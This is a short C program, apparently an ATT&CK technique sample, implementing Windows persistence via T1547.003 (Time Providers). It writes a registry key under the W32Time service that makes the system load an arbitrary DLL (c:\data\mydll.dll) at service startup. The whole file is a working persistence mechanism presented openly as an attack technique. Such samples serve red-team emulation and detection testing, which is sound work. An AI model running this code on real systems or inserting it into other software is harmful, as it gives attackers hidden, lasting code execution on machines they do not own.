// Link      = https://attack.mitre.org/techniques/T1547/003/
// Technique = Boot or Logon Autostart Execution: Time Providers
// ID        = T1547.003
// Tactics   = Persistence

#include <windows.h>

#define KEY_PATH "System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\MyTimer"
#define TO_LOAD "c:\\data\\mydll.dll"

int main() {
    HKEY hKey;
    DWORD enabled = 1;

    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, KEY_PATH, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey,NULL) != ERROR_SUCCESS) {
        return 1;
    }
    RegSetValueExA(hKey, "DllName", 0, REG_SZ, (const BYTE*)TO_LOAD, sizeof(TO_LOAD)+1);
    RegSetValueExA(hKey, "Enabled", 0, REG_DWORD, (const BYTE*)&enabled, sizeof(enabled));
    RegCloseKey(hKey);

    return 0;
}
